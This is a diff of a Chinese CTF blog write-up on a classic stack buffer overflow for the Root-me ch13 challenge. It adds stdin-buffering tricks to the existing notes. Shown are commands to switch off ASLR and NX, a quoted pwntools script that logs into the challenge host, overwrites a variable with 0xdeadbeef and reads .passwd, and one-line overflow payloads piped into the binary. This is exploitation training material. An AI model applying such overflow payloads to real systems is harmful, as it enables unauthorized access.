@@ -32,7 +32,7 @@
 <meta property="og:description" content="Sploitfun-Classic Stack Based Buffer Overflowsudo bash -c &quot;echo 0 &gt; &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space&quot;关闭ASLR具体可见https:&#x2F;&#x2F;blog.csdn.net&#x2F;Plus_RE&#x2F;article&#x2F;details&#x2F;79199772 gcc  -pie      Cre">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2020-11-10T01:33:50.000Z">
-<meta property="article:modified_time" content="2020-11-10T01:35:00.616Z">
+<meta property="article:modified_time" content="2020-11-10T06:30:49.804Z">
 <meta property="article:author" content="finsenty54">
 <meta property="article:tag" content="PWN">
 <meta name="twitter:card" content="summary">
@@ -296,7 +296,7 @@
       <span class="post-meta-item-text">发表于</span>
       
 
-      <time title="创建时间：2020-11-10 09:33:50 / 修改时间：09:35:00" itemprop="dateCreated datePublished" datetime="2020-11-10T09:33:50+08:00">2020-11-10</time>
+      <time title="创建时间：2020-11-10 09:33:50 / 修改时间：14:30:49" itemprop="dateCreated datePublished" datetime="2020-11-10T09:33:50+08:00">2020-11-10</time>
     </span>
 
   
@@ -339,7 +339,8 @@
 <li>创建符号表，符号表包含了程序中使用的变量名称的列表。</li>
 <li>关闭所有的优化机制，以便程序执行过程中严格按照原来的C代码进行。</li>
 </ol>
-<p><code>-z execstack </code>禁用NX保护<br>详细的保护机制讲解<a target="_blank" rel="noopener" href="https://introspelliam.github.io/2017/09/30/pwn/linux%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%B8%B8%E7%94%A8%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/">https://introspelliam.github.io/2017/09/30/pwn/linux%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%B8%B8%E7%94%A8%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/</a></p>
+<p><code>-z execstack </code>禁用NX保护</p>
+<p>详细的保护机制讲解<br><a target="_blank" rel="noopener" href="https://introspelliam.github.io/2017/09/30/pwn/linux%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%B8%B8%E7%94%A8%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/">https://introspelliam.github.io/2017/09/30/pwn/linux%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%B8%B8%E7%94%A8%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/</a></p>
 <p><code>gdb -q</code><br>  -q, –quiet, –silent<br>                     Do not print version number on startup.</p>
 <pre><code>gdb-peda$ r `python -c &#39;print &quot;A&quot;*300&#39;`
 
@@ -381,9 +382,12 @@ ret = pop EIP</code></pre>
 <hr>
 <p>别人使用脚本编写的</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># solution by MtucX</span></span><br><span class="line"># Require pwntools</span><br><span class="line">from pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">pwn_socket=ssh(host=&#x27;challenge02.root-me.org&#x27; ,user=&#x27;app-systeme-ch13&#x27; ,password=&#x27;app-systeme-ch13&#x27;,port=2222)</span><br><span class="line">pwned=pwn_socket.process(executable=&#x27;./ch13&#x27;)</span><br><span class="line">pwned.sendline(&#x27;A&#x27; * 40  + &#x27;\xef\xbe\xad\xde&#x27;)</span><br><span class="line">pwned.sendline(&#x27;cat .passwd&#x27;)</span><br><span class="line">pwned.interactive()</span><br></pre></td></tr></table></figure>
-
-
-
+<hr>
+<p>关于unix系统输入输出流<br><a target="_blank" rel="noopener" href="http://repository.root-me.org/Administration/Unix/Linux/EN%20-%20buffering%20in%20standard%20streams.pdf" title="stdio buffer">stdio buffer</a><br>参考：<a target="_blank" rel="noopener" href="http://showlinkroom.me/2017/11/20/Root-me-App-System01/">http://showlinkroom.me/2017/11/20/Root-me-App-System01/</a></p>
+<pre><code>python -c &#39;print &quot;a&quot;*40+&quot;\xef\xbe\xad\xde&quot; + &quot;\x00&quot;*4052 + &quot;cat .passwd&quot;&#39; | ./ch13</code></pre>
+<p>将stdin buffer填满，让数据不填入buffer中，留在外面。</p>
+<pre><code>(python -c &#39;print &quot;a&quot;*40+&quot;\xef\xbe\xad\xde&quot; &#39;; cat ) | ./ch13</code></pre>
+<p>不让当前的数据流中断，不会让输入流关闭的指令，直接使用cat的功能为将输入流复制到输出流中。</p>
 
     </div>
 
